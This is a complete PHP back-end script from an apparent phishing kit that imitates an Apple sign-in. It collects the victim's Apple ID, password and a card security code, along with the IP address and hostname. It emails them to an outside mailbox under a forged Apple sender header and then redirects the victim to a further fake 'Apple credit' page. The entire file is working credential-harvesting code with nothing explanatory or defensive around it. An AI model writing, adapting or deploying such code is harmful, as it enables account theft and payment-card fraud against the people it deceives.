<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg  = "======================= Apple =====================\n";
$bilsmg .= "Account ID : ".$_POST['theAccountName']."\n";
$bilsmg .= "Credit card security code : ".$_POST['theAccountName0']."\n";
$bilsmg .= "Password Account ID : ".$_POST['theAccountPW']."\n";
$bilsmg .= "===================\n";
$bilsmg .= "Client IP : ".$ip."\n";
$bilsmg .= "HostName : ".$hostname."\n";
$bilsmg .= "======================= Apple =====================\n";

$bilsnd = "spamiarskie@wp.pl";
$bilsub = "Your Apple Login No | $ip";
$bilhead = "From: Apple <login@itunes.cc>";
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


header("Location: Apple credit.html?cmd=_login-run&dispatch=5885d80a13c0db1f998ca054efbdf2c29878a435fe324eec2511727fbf3e9efcd8");
?>